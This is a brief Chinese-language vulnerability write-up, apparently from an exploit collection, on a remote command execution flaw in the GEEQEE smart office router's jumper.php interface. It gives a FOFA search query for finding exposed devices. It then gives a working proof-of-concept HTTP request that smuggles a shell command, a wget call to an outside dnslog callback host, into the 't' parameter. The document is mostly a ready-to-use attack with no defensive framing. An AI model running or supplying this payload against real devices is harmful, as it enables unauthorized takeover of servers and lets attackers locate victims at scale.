## 极企智能办公路由接口jumper.php存在RCE漏洞

极企智能办公路由接口jumper.php存在命令执行漏洞，导致服务器权限沦陷。

## fofa

```
app="GEEQEE-极企智能办公路由"
```

## poc

```
GET /notice/jumper.php?t=;wget%20http://xxx.dnslog.cn HTTP/1.1
Host: 
Connection: keep-alive
```

